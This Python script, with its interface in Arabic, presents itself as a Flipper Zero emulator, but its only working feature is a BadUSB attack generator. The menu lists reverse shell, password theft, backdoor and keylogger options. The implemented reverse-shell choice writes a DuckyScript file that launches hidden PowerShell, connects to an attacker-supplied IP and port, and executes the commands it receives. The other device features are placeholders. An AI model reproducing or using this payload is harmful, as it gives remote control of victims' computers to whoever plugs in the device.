#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Flipper Zero Emulator - محاكاة برمجية

import os
import sys
from colorama import init, Fore, Style
from banner import show_banner

init(autoreset=True)

class FlipperZeroEmulator:
    def __init__(self):
        self.name = "Flipper Zero Emulator"
    
    def show_menu(self):
        menu = f"""
{Fore.GREEN}╔══════════════════════════════════════════════╗
║     🐬  محاكي Flipper Zero                   ║
╠══════════════════════════════════════════════╣
║                                              ║
║  {Fore.WHITE}[1] {Fore.GREEN}GPIO Pin Control (تحكم بالدبابيس)    {Fore.GREEN}║
║  {Fore.WHITE}[2] {Fore.GREEN}RFID Read/Write (قراءة/كتابة)        {Fore.GREEN}║
║  {Fore.WHITE}[3] {Fore.GREEN}NFC Read/Write                       {Fore.GREEN}║
║  {Fore.WHITE}[4] {Fore.GREEN}IR Remote (تحكم بالأشعة تحت الحمراء){Fore.GREEN}║
║  {Fore.WHITE}[5] {Fore.GREEN}Sub-GHz Transmit (إرسال ترددات)      {Fore.GREEN}║
║  {Fore.WHITE}[6] {Fore.GREEN}BadUSB Script Generator               {Fore.GREEN}║
║  {Fore.WHITE}[7] {Fore.GREEN}iButton (Read/Emulate)                {Fore.GREEN}║
║                                              ║
║  {Fore.RED}[0] {Fore.RED}العودة للقائمة الرئيسية             {Fore.GREEN}║
║                                              ║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)
    
    def badusb_generator(self):
        """توليد سكريبتات BadUSB"""
        print(f"\n{Fore.YELLOW}[*] BadUSB Script Generator{Style.RESET_ALL}")
        print(f"""
{Fore.CYAN}اختر نوع الهجوم:
{Fore.WHITE}[1] {Fore.GREEN}Reverse Shell
{Fore.WHITE}[2] {Fore.GREEN}استخراج كلمات المرور
{Fore.WHITE}[3] {Fore.GREEN}تثبيت Backdoor
{Fore.WHITE}[4] {Fore.GREEN}Keylogger{Style.RESET_ALL}
        """)
        
        choice = input(f"{Fore.GREEN}╰➤ {Fore.YELLOW}اختر: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            ip = input(f"{Fore.WHITE}[?] IP المستمع: {Style.RESET_ALL}").strip()
            port = input(f"{Fore.WHITE}[?] المنفذ: {Style.RESET_ALL}").strip()
            
            script = f"""REM Camorro BadUSB - Reverse Shell
DEFAULTDELAY 50
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sendback=(iex $d 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sbb,0,$sbb.Length);$s.Flush()}};$c.Close()"
ENTER
"""
            filename = f"badusb_reverse_{port}.txt"
            with open(filename, "w") as f:
                f.write(script)
            print(f"{Fore.GREEN}[+] تم حفظ السكريبت في: {filename}{Style.RESET_ALL}")
    
    def run(self):
        show_banner("flipper")
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.GREEN}╰➤ {Fore.YELLOW}اختر [0-7]: {Style.RESET_ALL}")
            
            if choice == "0":
                break
            elif choice == "6":
                self.badusb_generator()
            else:
                print(f"{Fore.YELLOW}[!] هذه الميزة تتصل بجهاز Flipper Zero فعلي عبر Bluetooth/GPIO{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] يتم إضافة الدعم قريباً!{Style.RESET_ALL}")
